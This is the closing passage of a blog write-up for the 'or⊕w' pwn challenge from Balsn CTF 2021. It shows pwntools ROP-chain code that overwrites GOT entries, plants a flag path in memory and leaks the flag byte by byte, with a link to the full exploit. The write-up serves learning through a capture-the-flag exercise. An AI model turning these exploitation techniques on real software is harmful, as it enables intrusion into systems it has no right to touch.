+</div>
+<p>After this we resolve the <strong>close</strong> <strong>GOT</strong> address to <strong>open</strong> and fix the <strong>read</strong> <strong>GOT</strong> address. We also put the flag string in memory to be used by child ropchain to open the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#6272a4"># set close -&gt; open64</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">7</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;open64&#39;</span>] <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;close&#39;</span>])
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;close&#39;</span>] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(_3D_GDT)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#6272a4"># fix read&#39;s got address</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64((libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;read&#39;</span>] <span style="color:#ff79c6">-</span> POPRBX2) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffff</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(exe<span style="color:#ff79c6">.</span>got[<span style="color:#f1fa8c">&#39;read&#39;</span>] <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(_3D_GDT)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#6272a4"># store &#34;./fl&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(pwn<span style="color:#ff79c6">.</span>u32(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;./fl&#34;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(BSS_ADR<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(_3D_GDT)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span style="color:#6272a4"># store &#34;ag\x00\x00&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RPX)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(pwn<span style="color:#ff79c6">.</span>u32(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;ag</span><span style="color:#f1fa8c">\x00\x00</span><span style="color:#f1fa8c">&#34;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(BSS_ADR<span style="color:#ff79c6">+</span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x3d</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>stage_1 <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(_3D_GDT)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>
+</code></pre></div><p>Once you figure out how to execute different ROP chains with the same payload under parent and child, the rest of the exploitation is faily easy.</p>
+<p>I created a small function to give me ROP chain to leak a specific byte from the flag and then I just ran that exploit until I leaked the &ldquo;}&rdquo; character which means we got the whole flag.</p>
+<p>To get a nice output from the exploit I used pwntool&rsquo;s logging functionality.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; &#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">with</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>local(log_level<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;warn&#39;</span>), \
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>progress(<span style="color:#f1fa8c">&#39;Flag&#39;</span>, level<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>logging<span style="color:#ff79c6">.</span>WARN) <span style="color:#ff79c6">as</span> flag_leak:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    <span style="color:#ff79c6">while</span> i <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">41</span>:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>        io <span style="color:#ff79c6">=</span> start()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>        io<span style="color:#ff79c6">.</span>sendlineafter(
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>           <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Can you defeat orxw?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>           give_exploit_for_index(i)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>        )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>        flag <span style="color:#ff79c6">+=</span> io<span style="color:#ff79c6">.</span>recv()<span style="color:#ff79c6">.</span>strip()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        flag_leak<span style="color:#ff79c6">.</span>status(flag<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;latin1&#39;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>        i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    flag_leak<span style="color:#ff79c6">.</span>success(flag<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;latin1&#39;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>
+</code></pre></div><h3 id="final-exploit">Final Exploit</h3>
+<p>Complete exploit can be found : <a href="https://gist.github.com/X3eRo0/0a111c4930fea36d2bd6f1e5cc0d7696">here</a></p>
+<p>Running the exploit gives this output.</p>
+
+
+<script id="asciicast-ouRiDOvHeS6ae1hOEgkUl8mcs" src="https://asciinema.org/a/ouRiDOvHeS6ae1hOEgkUl8mcs.js" async></script>
+
+
+        </div>
+
+
+
+        <footer class="post-footer">
+                
+                
+                
+                <span class="post-categories">
+                        <a href="https://x3ero0.github.io/categories/ctf/">CTF</a>&emsp;
+                        
+                        <a href="https://x3ero0.github.io/categories/pwn/">Pwn</a>&emsp;
+                        
+                </span>
+                
+        
+                
+                
+                
+        </footer>
+        
+<table cellspacing="15" style="width:100%; border: none;">
+    <tr>
+        <td style="text-align: center; border: none; padding: 0px;">
+        </td>
+        <td style="text-align: center; border: none; padding: 0px;">
+        </td>
+    </tr>
+</table>
+
+        
+    </article>
+
+    
+
+</main>
+
+
+        <div class="sidebar1 widgets columns-1">
+
+    <aside>
+    
+</aside>
+    <aside class="widget widget_categories">
+        <h2>Categories</h2>
+        <ul class="widget__list"><li class="cat-item cat-item-2">
+                <a href="https://x3ero0.github.io/categories/crackmes/">Crackmes (7)</a>
+            </li><li class="cat-item cat-item-2">
+                <a href="https://x3ero0.github.io/categories/ctf/">CTF (2)</a>
+            </li><li class="cat-item cat-item-2">
+                <a href="https://x3ero0.github.io/categories/pwn/">Pwn (3)</a>
+            </li><li class="cat-item cat-item-2">
+                <a href="https://x3ero0.github.io/categories/rev/">Rev (5)</a>
+            </li>
+        </ul>
+    </aside>
+
+    <aside class="widget widget_recent_entries">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/">or⊕w writeup from Balsn CTF 2021</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/hyperion/">Hyperion Writeup</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/float-writeup/">Float Writeup</a>
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/hell86_from_ttlhacker/">Hell86 - ttlhacker</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/reversing_a_malware_in_disguise/">Reversing a malware in disguise</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/watevr_repyc/">Watevr_repyc</a>
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
+                    </li>
+                
+            
+        </ul>
+    </aside>
+
+    <aside class="widget widget_recent_entries">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/">or⊕w writeup from Balsn CTF 2021</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/hyperion/">Hyperion Writeup</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/float-writeup/">Float Writeup</a>
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/hell86_from_ttlhacker/">Hell86 - ttlhacker</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/reversing_a_malware_in_disguise/">Reversing a malware in disguise</a>
+                    </li>
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/watevr_repyc/">Watevr_repyc</a>
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
+                    </li>
+                
+            
+        </ul>
+    </aside>
+</div>
+        </div>
+        </div>
+<footer role="contentinfo" class="document-footer contentinfo widgets columns-1">
+
+    <aside class="widget widget_text">
+        <div class="textwidget">
+            <p>© x3ero0&#39;s blog</p>
+        </div>
+    </aside>
+</footer>
+</div>
+
+    </body>
+</html>
